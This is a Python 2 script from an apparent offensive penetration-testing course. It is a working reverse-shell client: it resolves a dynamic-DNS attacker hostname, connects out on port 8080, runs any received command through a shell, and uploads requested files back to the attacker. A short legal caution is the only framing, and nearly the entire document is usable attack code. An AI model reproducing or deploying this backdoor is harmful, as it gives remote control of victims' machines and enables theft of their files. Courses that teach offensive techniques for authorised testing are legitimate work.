'''
Caution
--------
Using this script for any malicious purpose is prohibited and against the law. Please read no-ip.com terms and conditions carefully. 
Use it on your own risk. 
'''

# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

# Installing noip agent
# http://www.noip.com/support/knowledgebase/installing-the-linux-dynamic-update-client-on-ubuntu/


import socket 
import subprocess 
import os

def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: 
        s.send('Unable to find out the file')

def connect(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 8080))  # instead of hardcoding the ip addr statically we pass our ip variable 
 
    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break 


        elif 'grab' in command: 
            grab,path = command.split('*')
            try:
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )
                pass
        
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    ip =  socket.gethostbyname('pythonhussam.ddns.net') # We will use the os to send out a dns query for pythonhussam.ddns.net
    print "Resolved IP was: " + ip                      # Please don't forget to change this name to yours :D
    connect(ip) # we will pass the ip variable which contains the attacker ip to connect function 
main()










